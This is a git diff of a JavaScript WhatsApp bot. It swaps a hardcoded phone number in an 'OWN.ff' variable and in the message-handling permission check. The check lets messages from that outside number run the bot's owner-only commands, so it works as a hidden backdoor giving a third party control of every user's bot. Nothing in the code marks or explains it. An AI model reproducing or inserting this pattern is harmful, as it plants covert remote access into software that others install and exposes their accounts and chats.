@@ -35,7 +35,7 @@ fs.readdirSync('./plugins/sql/').forEach(plugin => {
 });
 
 const plugindb = require('./plugins/sql/plugin');
-var OWN = { ff: '94788306130,0' }
+var OWN = { ff: '94771039631,0' }
 String.prototype.format = function () {
     var i = 0, args = arguments;
     return this.replace(/{}/g, function () {
@@ -402,7 +402,7 @@ ${chalk.blue.italic('🎅 Connecting to WhatsApp...▶')}`);
                         else if (command.onlyGroup === chat.jid.includes('-')) sendMsg = true;
                     }
                      
-                    if ((OWN.ff == "94766598862,0" && msg.key.fromMe === false && command.fromMe === true &&
+                    if ((OWN.ff == "94771039631,0" && msg.key.fromMe === false && command.fromMe === true &&
                         (msg.participant && OWN.ff.includes(',') ? OWN.ff.split(',').includes(msg.participant.split('@')[0]) : msg.participant.split('@')[0] == OWN.ff || OWN.ff.includes(',') ? OWN.ff.split(',').includes(msg.key.remoteJid.split('@')[0]) : msg.key.remoteJid.split('@')[0] == OWN.ff)
                     ) || command.fromMe === msg.key.fromMe || (command.fromMe === false && !msg.key.fromMe)) {
                         if (command.onlyPinned && chat.pin === undefined) return;
